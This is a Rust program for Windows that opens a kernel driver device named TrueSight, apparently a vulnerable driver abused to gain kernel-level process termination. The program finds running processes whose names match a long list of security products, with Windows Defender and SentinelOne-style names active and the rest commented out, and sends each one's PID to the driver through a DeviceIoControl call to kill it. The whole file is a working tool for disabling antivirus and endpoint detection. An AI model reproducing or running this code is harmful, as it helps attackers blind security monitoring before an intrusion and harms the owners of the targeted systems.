use std::{
    io::{stderr, Write},
    mem::size_of,
    ptr::addr_of_mut,
    thread::sleep,
    time::Duration,
};

use windows::{
    core::{PCSTR, PSTR, PWSTR},
    Win32::{
        Foundation::{CloseHandle, GetLastError},
        Storage::FileSystem::{
            CreateFileA, FILE_CREATION_DISPOSITION, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_NONE,
        },
        System::{
            Diagnostics::ToolHelp::{
                CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                TH32CS_SNAPPROCESS,
            },
            Threading::{
                CreateProcessA, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOA,
            },
            IO::DeviceIoControl,
        },
    },
};

const PROCESS_LIST: [&str; 4] = [
    // "activeconsole",
    // "anti malware",
    // "anti-malware",
    // "antimalware",
    // "anti virus",
    // "anti-virus",
    // "antivirus",
    // "appsense",
    // "authtap",
    // "avast",
    // "avecto",
    // "canary",
    // "carbonblack",
    // "carbon black",
    // "cb.exe",
    // "ciscoamp",
    // "cisco amp",
    // "countercept",
    // "countertack",
    // "cramtray",
    // "crssvc",
    // "crowdstrike",
    // "csagent",
    // "csfalcon",
    // "csshel",
    // "cybereason",
    // "cyclorama",
    // "cylance",
    // "cyoptics",
    // "cyupdate",
    // "cyvera",
    // "cyserver",
    // "cytray",
    // "darktrace",
    // "defendpoint",
    // "defender",
    // "eectr",
    // "elastic",
    // "endgame",
    // "f-secure",
    // "forcepoint",
    // "fireeye",
    // "groundling",
    // "GRRservic",
    // "inspector",
    // "ivanti",
    // "kaspersky",
    // "lacuna",
    // "logrhythm",
    // "malware",
    // "mandiant",
    // "mcafee",
    // "morphisec",
    // "msascui",
    "msmpeng",
    "nissrv",
    // "omni",
    // "omniagent",
    // "osquery",
    // "palo alto networks",
    // "pgeposervice",
    // "pgsystemtray",
    // "privilegeguard",
    // "procwal",
    // "protectorservic",
    // "qradar",
    // "redcloak",
    // "secureworks",
    "securityhealthservice",
    // "semlaunchsv",
    "sentine",
    // "sepliveupdat",
    // "sisidsservice",
    // "sisipsservice",
    // "sisipsuti",
    // "smc.exe",
    // "smcgui",
    // "snac64",
    // "sophos",
    // "splunk",
    // "srtsp",
    // "symantec",
    // "symcorpu",
    // "symefasi",
    // "sysinterna",
    // "sysmon",
    // "tanium",
    // "tda.exe",
    // "tdawork",
    // "tpython",
    // "vectra",
    // "wincollect",
    // "windowssensor",
    // "wireshark",
    // "threat",
    // "xagt.exe",
    // "xagtnotif.exe",
    // "mssense",
];

fn should_kill(name: &str) -> bool {
    let lower = name.to_lowercase();
    PROCESS_LIST.into_iter().any(|p| lower.contains(p))
}

fn enumerate_processes() -> anyhow::Result<impl Iterator<Item = (u32, String)>> {
    let mut all_procs = Vec::new();

    let h_snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) }?;

    let mut proc_entry = PROCESSENTRY32W {
        dwSize: size_of::<PROCESSENTRY32W>() as _,
        ..Default::default()
    };

    unsafe { Process32FirstW(h_snap, addr_of_mut!(proc_entry)) }?;

    let name = unsafe { PWSTR(proc_entry.szExeFile.as_mut_ptr()).to_string() }?;
    // println!("Found {} ({})", name, proc_entry.th32ProcessID);
    all_procs.push((proc_entry.th32ProcessID, name));

    while unsafe { Process32NextW(h_snap, addr_of_mut!(proc_entry)) }.is_ok() {
        let name = unsafe { PWSTR(proc_entry.szExeFile.as_mut_ptr()).to_string() }?;
        // println!("Found {} ({})", name, proc_entry.th32ProcessID);
        all_procs.push((proc_entry.th32ProcessID, name));
    }

    Ok(all_procs.into_iter().filter(|(_, s)| should_kill(s)))
}

fn main() -> anyhow::Result<()> {
    unsafe {
        let mut stderr = stderr().lock();

        let device_handle = match CreateFileA(
            PCSTR("\\\\.\\TrueSight\0".as_ptr()),
            0xC0000000,
            FILE_SHARE_NONE,
            None,
            FILE_CREATION_DISPOSITION(3),
            FILE_FLAGS_AND_ATTRIBUTES(0x80),
            None,
        ) {
            Ok(h) => h,
            Err(_) => panic!("Driver not loaded"),
        };

        let _ = writeln!(stderr, "Driver definitely loaded");

        for (pid, name) in enumerate_processes()? {
            let mut process_id: u32 = pid;
            let mut output: u32 = 0;
            let mut bytes_returned: u32 = 0;

            let _ = writeln!(stderr, "Killing {name} ({pid})");

            if DeviceIoControl(
                device_handle,
                0x22e044,
                Some(std::ptr::addr_of_mut!(process_id) as _),
                std::mem::size_of::<u32>() as _,
                Some(std::ptr::addr_of_mut!(output) as _),
                std::mem::size_of::<u32>() as _,
                Some(std::ptr::addr_of_mut!(bytes_returned) as _),
                None,
            )
            .is_err()
            {
                if let Err(e) = GetLastError() {
                    let _ = writeln!(stderr, "Failed to terminate: {:?}", e);
                }
            }
        }

        let _ = writeln!(stderr, "Donezoed");

        let _ = CloseHandle(device_handle);
    }

    Ok(())
}
